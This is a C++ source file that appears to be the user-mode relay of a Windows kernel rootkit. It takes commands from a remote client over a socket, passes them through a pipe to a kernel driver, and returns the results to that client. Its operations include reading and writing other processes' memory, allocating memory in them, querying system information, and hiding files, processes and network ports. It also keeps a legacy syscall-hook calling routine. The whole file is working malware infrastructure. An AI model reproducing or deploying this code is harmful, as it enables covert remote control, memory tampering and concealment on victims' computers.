#include "requests.h"
#pragma warning(disable : 4244)


// Legacy code, not used anymore
template<typename ... Arg>
ULONG64 CallHook(const Arg ... args) {
	printf("Loading user32.dll ..\n");
	if (LoadLibraryA("user32.dll") == NULL) {
		printf("Cannot call the function - user32.dll is not loaded!\n");
		return NULL;
	}
	printf("user32.dll loaded!\n");

	printf("Creating a pointer to the NtQueryCompositionSurfaceStatistics system service wrapper (win32u!NtQueryCompositionSurfaceStatistics)..\n");
	HMODULE Win32uHndl = LoadLibraryA("win32u.dll");
	if (Win32uHndl == NULL) {
		printf("Cannot call the function - win32u.dll is not loaded!\n");
		return NULL;
	}
	printf("win32u.dll loaded!\n");

	void* HookToFunc = GetProcAddress(Win32uHndl, "NtQueryCompositionSurfaceStatistics");  // get memory address of the hookto function (wrapper of a system service)
	if (HookToFunc == NULL) {
		printf("Cannot call the function - Could not get a pointer to NtQueryCompositionSurfaceStatistics from win32u.dll..\n");
		return NULL;
	}

	printf("Creating a function variable to use it for calling NtQueryCompositionSurfaceStatistics..\n");
	auto HookToVar = static_cast<uint64_t(_stdcall*)(Arg...)>(HookToFunc);  // export the function so i can call it

	printf("Calling the function variable with the supplier argument/s..\n");
	uint64_t HookToRet = HookToVar(args ...);

	printf("Function had worked and return value/s were received, wait for processing..\n");
	if (HookToRet == NULL) {
		printf("Function did not return anything (NULL)..\n");
		HookToRet = 1;
	}
	return HookToRet;
}


int DriverCalls::CallKernelDriver(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, BOOL PassBack, HANDLE* PipeHandle, LogFile* MediumLog) {
	/*
	if(CallHook(RootkInst) == NULL){
		printf("CallKernelDriver failed - CallHook() returned NULL!\n");
		return FALSE;
	}
	*/
	PASS_DATA SocketResult = { 0 };
	DWORD LastError = WritePipe(PipeHandle, (PVOID)RootkInst, sizeof(ROOTKIT_MEMORY), MediumLog);
	if (LastError != 0) {
		return -1;
	}

	LastError = ReadPipe(PipeHandle, (PVOID)RootkInst, sizeof(ROOTKIT_MEMORY), MediumLog);
	if (LastError != 0) {
		return -1;
	}

	if (PassBack) {
		SocketResult = root_internet::SendData(ClientToServerSocket, RootkInst, sizeof(ROOTKIT_MEMORY), FALSE, 0, MediumLog);
		if (SocketResult.err || SocketResult.value != sizeof(ROOTKIT_MEMORY)) {
			RequestHelpers::LogMessage("CallKernelDriver failed - cannot return results from driver back to client!\n", MediumLog, TRUE, GetLastError());
			return 0;
		}
	}
	RequestHelpers::LogMessage("CallKernelDriver success!\n", MediumLog, FALSE, 0);
	return 1;
}


int DriverCalls::WriteKernelCall(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, char* WriteFromStr, HANDLE* PipeHandle, LogFile* MediumLog) {
	PASS_DATA SocketResult = { 0 };
	ULONG64 SourceProcess = 0;
	ULONG64 DestinationProcess = 0;
	PVOID LocalWriteSource = NULL;
	char* DestinationModule = NULL;
	char MdlMalloc = 1;
	ULONG WriteToMdlSize = 0;
	SIZE_T AllocationSize = 0;
	ROOTKIT_UNEXERR UnexpectedError = successful;
	SYSTEM_INFO LocalSysInfo = { 0 };
	int DriverResult = 0;


	// Get secondary module string (writing destination):
	if (!root_internet::GetString(ClientToServerSocket, &DestinationModule, MediumLog)) {
		return 0;
	}


	// Get main structure with parameters for the operation:
	SocketResult = root_internet::RecvData(ClientToServerSocket, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0, MediumLog);
	if (SocketResult.err || SocketResult.value != sizeof(ROOTKIT_MEMORY)) {
		free(DestinationModule);
		return 0;
	}
	RootkInst->IsFlexible = TRUE;
	RootkInst->DstMdlName = (char*)DestinationModule;
	RootkInst->MdlName = WriteFromStr;
	GetSystemInfo(&LocalSysInfo);
	AllocationSize = (SIZE_T)(((RootkInst->Size / LocalSysInfo.dwPageSize) + 1) * LocalSysInfo.dwPageSize);


	// if writing is from a user-supplied buffer receive the buffer:
	if (UnexpectedError == successful) {
		if (strcmp(RootkInst->MdlName, REGULAR_BUFFER_WRITE) == 0) {
			RootkInst->Status = (NTSTATUS)REGULAR_BUFFER;
			LocalWriteSource = malloc(AllocationSize);
			if (LocalWriteSource == NULL) {
				RequestHelpers::LogMessage("Cannot allocate buffer for writing locally\n", MediumLog, TRUE, GetLastError());
				free(DestinationModule);
				UnexpectedError = memalloc;
			}
			else {
				SocketResult = root_internet::RecvData(ClientToServerSocket, (int)RootkInst->Size, LocalWriteSource, FALSE, 0, MediumLog);
				if (SocketResult.err || SocketResult.value != RootkInst->Size) {
					RequestHelpers::LogMessage("Cannot get write value\n", MediumLog, TRUE, GetLastError());
					free(LocalWriteSource);
					free(DestinationModule);
					return FALSE;
				}
				RootkInst->Buffer = LocalWriteSource;
			}
		}

	}


	// Resolving source and destination module PIDs:
	if (UnexpectedError == successful) {
		UnexpectedError = RequestHelpers::ResolvePID((char*)RootkInst->MdlName, &SourceProcess);
		if (UnexpectedError == successful) {
			UnexpectedError = RequestHelpers::ResolvePID((char*)RootkInst->DstMdlName, &DestinationProcess);
			if (UnexpectedError == successful) {

				// Configure other struct parameters if succeeded so far:
				RootkInst->MainPID = DestinationProcess;
				RootkInst->SemiPID = SourceProcess;
				RootkInst->MedPID = (ULONG64)GetCurrentProcessId();
			}
		}
	}
	RootkInst->Unexpected = UnexpectedError;
	if (UnexpectedError != successful) {
		free(DestinationModule);
		SocketResult = root_internet::SendData(ClientToServerSocket, RootkInst, sizeof(ROOTKIT_MEMORY), FALSE, 0, MediumLog);
		return 0;
	}


	// Perform the operation and return the results to the client:
	DriverResult = CallKernelDriver(ClientToServerSocket, RootkInst, TRUE, PipeHandle, MediumLog);
	if (!RootkInst->IsFlexible) {
		RequestHelpers::LogMessage("transformation of regular data from KM-UM confirmed!\n", MediumLog, FALSE, 0);
	}
	else {
		RequestHelpers::LogMessage("transformation of regular data from KM-UM not working correctly!!\n", MediumLog, TRUE, GetLastError());
	}

	free(LocalWriteSource);
	free(DestinationModule);
	return DriverResult;
}


int DriverCalls::ReadKernelCall(SOCKET ClientToServerSocket, PVOID LocalRead, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog) {
	PASS_DATA SocketResult = { 0 };
	ULONG64 SourceProcess = 0;
	ULONG64 DestinationProcess = 0;
	ROOTKIT_UNEXERR UnexpectedError = successful;
	int DriverResult = 0;
	SIZE_T AllocationSize = 0;
	char FailedValue = 1;  // Sent as a dummy value to sign failure
	SYSTEM_INFO LocalSysInfo = { 0 };


	// Receive the main structure with the parameters for the operation:
	SocketResult = root_internet::RecvData(ClientToServerSocket, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0, MediumLog);
	if (SocketResult.err || SocketResult.value != sizeof(ROOTKIT_MEMORY)) {
		return 0;
	}


	// Set up local parameters for the request:
	RootkInst->IsFlexible = TRUE;
	RootkInst->MdlName = ModuleName;
	GetSystemInfo(&LocalSysInfo);
	AllocationSize = (SIZE_T)(((RootkInst->Size / LocalSysInfo.dwPageSize) + 1) * LocalSysInfo.dwPageSize);
	LocalRead = malloc(AllocationSize);
	if (LocalRead == NULL) {
		UnexpectedError = memalloc;
	}


	// Resolving source and destination module PIDs:
	if (UnexpectedError == successful) {
		RootkInst->DstMdlName = MEDIUM_AS_SOURCE_MODULE;
		UnexpectedError = RequestHelpers::ResolvePID((char*)RootkInst->MdlName, &DestinationProcess);
		if (UnexpectedError == successful) {
			UnexpectedError = RequestHelpers::ResolvePID((char*)RootkInst->MdlName, &SourceProcess);
			if (UnexpectedError == successful) {

				// Call driver with parameters if successful so far:
				RootkInst->Out = LocalRead;
				RootkInst->MainPID = SourceProcess;
				RootkInst->SemiPID = DestinationProcess;
				RootkInst->MedPID = (ULONG64)GetCurrentProcessId();
				DriverResult = CallKernelDriver(ClientToServerSocket, RootkInst, FALSE, PipeHandle, MediumLog);
				if (!RootkInst->IsFlexible) {
					RequestHelpers::LogMessage("transformation of regular data from KM-UM confirmed!\n", MediumLog, FALSE, 0);
				}
				else {
					RequestHelpers::LogMessage("transformation of regular data from KM-UM not working correctly!!\n", MediumLog, TRUE, GetLastError());
				}
			}
		}
	}


	// Return the results of the operation to the client:
	if (UnexpectedError == successful && DriverResult == 1) {
		SocketResult = root_internet::SendData(ClientToServerSocket, LocalRead, (int)RootkInst->Size, FALSE, 0, MediumLog);
		if (SocketResult.err || SocketResult.value != (int)RootkInst->Size) {
			return 0;
		}
	}
	else {
		SocketResult = root_internet::SendData(ClientToServerSocket, &FailedValue, sizeof(FailedValue), FALSE, 0, MediumLog);
		return DriverResult;
	}


	// Return communication struct with the results of the operation:
	RootkInst->Unexpected = successful;
	SocketResult = root_internet::SendData(ClientToServerSocket, RootkInst, sizeof(ROOTKIT_MEMORY), FALSE, 0, MediumLog);
	if (SocketResult.err || SocketResult.value != sizeof(ROOTKIT_MEMORY)) {
		return 0;
	}
	return 1;
}


int DriverCalls::MdlBaseKernelCall(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog) {
	PASS_DATA SocketResult = { 0 };
	ULONG64 ProcessId = 0;
	int DriverResult = FALSE;


	// Receive the main structure with the parameters for the operation:
	SocketResult = root_internet::RecvData(ClientToServerSocket, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0, MediumLog);
	if (SocketResult.err || SocketResult.value != sizeof(ROOTKIT_MEMORY)) {
		return 0;
	}
	RootkInst->MdlName = ModuleName;


	// Get module PID and call driver with parameters if resolved PID successfully:
	if (RequestHelpers::ResolvePID((char*)RootkInst->MdlName, &ProcessId) == successful) {
		RootkInst->Unexpected = successful;
		RootkInst->MainPID = ProcessId;
		RootkInst->MedPID = (ULONG64)GetCurrentProcessId();
		RootkInst->IsFlexible = TRUE;
		DriverResult = CallKernelDriver(ClientToServerSocket, RootkInst, TRUE, PipeHandle, MediumLog);
		if (!RootkInst->IsFlexible) {
			RequestHelpers::LogMessage("transformation of regular data from KM-UM confirmed!\n", MediumLog, FALSE, 0);
		}
		else {
			RequestHelpers::LogMessage("transformation of regular data from KM-UM not working correctly!!\n", MediumLog, TRUE, GetLastError());
		}
		return DriverResult;
	}
	RootkInst->Unexpected = relevantpid;
	SocketResult = root_internet::SendData(ClientToServerSocket, RootkInst, sizeof(ROOTKIT_MEMORY), FALSE, 0, MediumLog);
	return 0;
}


int DriverCalls::SysInfoKernelCall(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, PVOID AttrBuffer, char* InfoTypesStr, ROOTKIT_UNEXERR Err, ULONG64 AttrBufferSize, HANDLE* PipeHandle, LogFile* MediumLog) {
	PASS_DATA SocketResult = { 0 };
	PVOID SysDataBuffer = NULL;
	ULONG64 TotalSize = 0;
	char FailedBuffer = 'N';  // Sent as an invalid buffer to signal failure
	int DriverResult = FALSE;


	// Receive the main structure with the parameters for the operation:
	SocketResult = root_internet::RecvData(ClientToServerSocket, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0, MediumLog);
	if (SocketResult.err || SocketResult.value != sizeof(ROOTKIT_MEMORY)) {
		Err = receivedata;
	}
	else {
		RootkInst->MdlName = InfoTypesStr;
	}


	// Handling initial unexpected errors:
	if (Err != successful) {
		RootkInst->Unexpected = Err;
		SocketResult = root_internet::SendData(ClientToServerSocket, RootkInst, sizeof(ROOTKIT_MEMORY), FALSE, 0, MediumLog);
		return 0;
	}

	// Pass the arguments for the request of system information:
	RootkInst->Unexpected = successful;
	RootkInst->Operation = RKOP_SYSINFO;
	RootkInst->Buffer = AttrBuffer;
	RootkInst->MainPID = (ULONG64)GetCurrentProcessId();
	RootkInst->MedPID = (ULONG64)GetCurrentProcessId();
	RootkInst->Size = AttrBufferSize;
	RootkInst->IsFlexible = TRUE;
	DriverResult = CallKernelDriver(ClientToServerSocket, RootkInst, TRUE, PipeHandle, MediumLog);
	if (!RootkInst->IsFlexible) {
		RequestHelpers::LogMessage("transformation of regular data from KM-UM confirmed!\n", MediumLog, FALSE, 0);
	}
	else {
		RequestHelpers::LogMessage("transformation of regular data from KM-UM not working correctly!!\n", MediumLog, TRUE, GetLastError());
	}


	// Return the actual buffer with system information to the client:
	if (DriverResult == 1) {
		TotalSize = RootkInst->Size;
		SysDataBuffer = RootkInst->Out;
		SocketResult = root_internet::SendData(ClientToServerSocket, &TotalSize, sizeof(TotalSize), FALSE, 0, MediumLog);
		if (SocketResult.err || SocketResult.value != sizeof(TotalSize)) {
			VirtualFree(SysDataBuffer, 0, MEM_RELEASE);
			return 0;
		}

		SocketResult = root_internet::SendData(ClientToServerSocket, SysDataBuffer, (int)TotalSize, FALSE, 0, MediumLog);
		VirtualFree(SysDataBuffer, 0, MEM_RELEASE);
		if (SocketResult.err || SocketResult.value != (int)TotalSize) {
			return 0;
		}


		// Send back updated attribute buffer:
		SocketResult = root_internet::SendData(ClientToServerSocket, AttrBuffer, (int)AttrBufferSize, FALSE, 0, MediumLog);
		if (SocketResult.err || SocketResult.value != AttrBufferSize) {
			return 0;
		}
		return 1;
	}

	else {
		SocketResult = root_internet::SendData(ClientToServerSocket, &FailedBuffer, sizeof(FailedBuffer), FALSE, 0, MediumLog);
		return DriverResult;
	}
}


int DriverCalls::AllocSpecKernelCall(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog){
	PASS_DATA SocketResult = { 0 };
	ULONG64 ProcessId = 0;
	int DriverResult = FALSE;
	char FailedBuffer = 1;  // Sent instead of an output buffer to signal failure


	// Receive the main structure with the parameters for the operation:
	SocketResult = root_internet::RecvData(ClientToServerSocket, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0, MediumLog);
	if (SocketResult.err || SocketResult.value != sizeof(ROOTKIT_MEMORY)) {
		return 0;
	}


	// Resolve process ID of allocation module and exit if failed:
	if (RequestHelpers::ResolvePID((char*)ModuleName, &ProcessId) != successful) {
		SocketResult = root_internet::SendData(ClientToServerSocket, &FailedBuffer, sizeof(FailedBuffer), FALSE, 0, MediumLog);
		return 0;
	}


	// Call the driver with the parameters:
	RootkInst->Unexpected = successful;
	RootkInst->MdlName = ModuleName;
	RootkInst->MainPID = ProcessId;
	RootkInst->MedPID = (ULONG64)GetCurrentProcessId();
	DriverResult = CallKernelDriver(ClientToServerSocket, RootkInst, TRUE, PipeHandle, MediumLog);
	if (!RootkInst->IsFlexible) {
		RequestHelpers::LogMessage("transformation of regular data from KM-UM confirmed!\n", MediumLog, FALSE, 0);
	}
	else {
		RequestHelpers::LogMessage("transformation of regular data from KM-UM not working correctly!!\n", MediumLog, TRUE, GetLastError());
	}

	if (RootkInst->Buffer == RootkInst->Out) {
		printf("Allocation address stayed the same (%p)!\n", RootkInst->Buffer);
	}
	else {
		printf("Allocation address did not stay the same (%p, %p)!\n", RootkInst->Buffer, RootkInst->Out);
	}
	return DriverResult;
}




int DriverCalls::HideFileKernelCall(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog) {
	PASS_DATA SocketResult = { 0 };
	int DriverResult = FALSE;
	NTSTATUS RequestStatus = STATUS_UNSUCCESSFUL;
	WCHAR FilePath[1024] = { 0 };
	DWORD FilePathLength = 0;
	PVOID DummyAddress = NULL;


	// Receive the request status to verify if other preperations are needed:
	SocketResult = root_internet::RecvData(ClientToServerSocket, sizeof(NTSTATUS), &RequestStatus, FALSE, 0, MediumLog);
	if (SocketResult.err || SocketResult.value != sizeof(NTSTATUS)) {
		return 0;
	}
	if (RequestStatus == HIDE_FILEFOLDER) {
		SocketResult = root_internet::RecvData(ClientToServerSocket, sizeof(DWORD), &FilePathLength, FALSE, 0, MediumLog);
		if (SocketResult.err || SocketResult.value != sizeof(DWORD)) {
			return 0;
		}
		SocketResult = root_internet::RecvData(ClientToServerSocket, FilePathLength, FilePath, FALSE, 0, MediumLog);
		if (SocketResult.err || SocketResult.value != FilePathLength) {
			return 0;
		}
	}

	// Receive the main structure with the parameters for the operation:
	SocketResult = root_internet::RecvData(ClientToServerSocket, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0, MediumLog);
	if (SocketResult.err || SocketResult.value != sizeof(ROOTKIT_MEMORY)) {
		return 0;
	}


	// Set important arguments:
	if (RequestStatus == HIDE_FILEFOLDER) {
		RootkInst->Buffer = (PVOID)FilePath;
		RootkInst->Size = (ULONG64)FilePathLength;
	}
	else if (RequestStatus == SHOWHIDDEN_FILEFOLDER) {
		RootkInst->Out = &DummyAddress;
	}


	// Pass struct argument to the driver:
	RootkInst->Unexpected = successful;
	RootkInst->MdlName = ModuleName;
	RootkInst->MainPID = (ULONG64)GetCurrentProcessId();
	RootkInst->MedPID = (ULONG64)GetCurrentProcessId();
	DriverResult = CallKernelDriver(ClientToServerSocket, RootkInst, TRUE, PipeHandle, MediumLog);
	if (!RootkInst->IsFlexible) {
		RequestHelpers::LogMessage("transformation of regular data from KM-UM confirmed!\n", MediumLog, FALSE, 0);
	}
	else {
		RequestHelpers::LogMessage("transformation of regular data from KM-UM not working correctly!!\n", MediumLog, TRUE, GetLastError());
	}


	// Parse returned data correctly (after sending back main struct):
	if ((DriverResult == 0 || DriverResult == 1) && RequestStatus == SHOWHIDDEN_FILEFOLDER && RootkInst->Size != 0) {
		SocketResult = root_internet::SendData(ClientToServerSocket, RootkInst->Out, (int)RootkInst->Size, FALSE, 0, MediumLog);
		VirtualFree(RootkInst->Out, 0, MEM_RELEASE);  // Release the allocated memory that was injected into by driver
		if (SocketResult.err || SocketResult.value != RootkInst->Size) {
			return 0;
		}
	}
	return DriverResult;
}




int DriverCalls::HideProcessKernelCall(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog) {
	PASS_DATA SocketResult = { 0 };
	int DriverResult = FALSE;
	NTSTATUS RequestStatus = STATUS_UNSUCCESSFUL;
	PVOID DummyAddress = NULL;


	// Receive the request status to verify if other preperations are needed (add preoperations if needed):
	SocketResult = root_internet::RecvData(ClientToServerSocket, sizeof(NTSTATUS), &RequestStatus, FALSE, 0, MediumLog);
	if (SocketResult.err || SocketResult.value != sizeof(NTSTATUS)) {
		return 0;
	}


	// Receive the main structure with the parameters for the operation:
	SocketResult = root_internet::RecvData(ClientToServerSocket, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0, MediumLog);
	if (SocketResult.err || SocketResult.value != sizeof(ROOTKIT_MEMORY)) {
		return 0;
	}


	// Set important arguments and verify parameters before sending to driver:
	if (RequestStatus == SHOWHIDDEN_PROCESS) {
		RootkInst->Out = &DummyAddress;  // A real address from medium should be provided for listing processes/ports
	}


	// Pass struct argument to the driver:
	RootkInst->Unexpected = successful;
	RootkInst->MdlName = ModuleName;
	RootkInst->MedPID = (ULONG64)GetCurrentProcessId();;
	DriverResult = CallKernelDriver(ClientToServerSocket, RootkInst, TRUE, PipeHandle, MediumLog);
	if (!RootkInst->IsFlexible) {
		RequestHelpers::LogMessage("transformation of regular data from KM-UM confirmed!\n", MediumLog, FALSE, 0);
	}
	else {
		RequestHelpers::LogMessage("transformation of regular data from KM-UM not working correctly!!\n", MediumLog, TRUE, GetLastError());
	}


	// Parse returned data correctly (after sending back main struct):
	if ((DriverResult == 0 || DriverResult == 1) && RequestStatus == SHOWHIDDEN_PROCESS && RootkInst->Size != 0) {
		SocketResult = root_internet::SendData(ClientToServerSocket, RootkInst->Out, RootkInst->Size, FALSE, 0, MediumLog);
		VirtualFree(RootkInst->Out, 0, MEM_RELEASE);  // Release the allocated memory that was injected into by driver
		if (SocketResult.err || SocketResult.value != RootkInst->Size) {
			return 0;
		}
	}
	return DriverResult;
}


int DriverCalls::HidePortCommunicationKernelCall(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog) {
	PASS_DATA SocketResult = { 0 };
	int DriverResult = FALSE;
	NTSTATUS RequestStatus = STATUS_UNSUCCESSFUL;
	PVOID DummyAddress = NULL;


	// Receive the request status to verify if other preperations are needed (add preoperations here if needed):
	SocketResult = root_internet::RecvData(ClientToServerSocket, sizeof(NTSTATUS), &RequestStatus, FALSE, 0, MediumLog);
	if (SocketResult.err || SocketResult.value != sizeof(NTSTATUS)) {
		return 0;
	}


	// Receive the main structure with the parameters for the operation:
	SocketResult = root_internet::RecvData(ClientToServerSocket, sizeof(ROOTKIT_MEMORY), RootkInst, FALSE, 0, MediumLog);
	if (SocketResult.err || SocketResult.value != sizeof(ROOTKIT_MEMORY)) {
		return 0;
	}


	// Set important arguments and verify parameters before sending to driver:
	if (RequestStatus == SHOWHIDDEN_PORTS) {
		RootkInst->Out = &DummyAddress;  // A real address from medium should be provided for listing processes/ports
	}


	// Pass struct argument to the driver:
	RootkInst->Unexpected = successful;
	RootkInst->MdlName = ModuleName;
	RootkInst->MedPID = (ULONG64)GetCurrentProcessId();;
	DriverResult = CallKernelDriver(ClientToServerSocket, RootkInst, TRUE, PipeHandle, MediumLog);
	if (!RootkInst->IsFlexible) {
		RequestHelpers::LogMessage("transformation of regular data from KM-UM confirmed!\n", MediumLog, FALSE, 0);
	}
	else {
		RequestHelpers::LogMessage("transformation of regular data from KM-UM not working correctly!!\n", MediumLog, TRUE, GetLastError());
	}


	// Parse returned data correctly (after sending back main struct):
	if ((DriverResult == 0 || DriverResult == 1) && RequestStatus == SHOWHIDDEN_PORTS && RootkInst->Size != 0) {
		SocketResult = root_internet::SendData(ClientToServerSocket, RootkInst->Out, RootkInst->Size, FALSE, 0, MediumLog);
		VirtualFree(RootkInst->Out, 0, MEM_RELEASE);  // Release the allocated memory that was injected into by driver
		if (SocketResult.err || SocketResult.value != RootkInst->Size) {
			return 0;
		}
	}
	return DriverResult;
}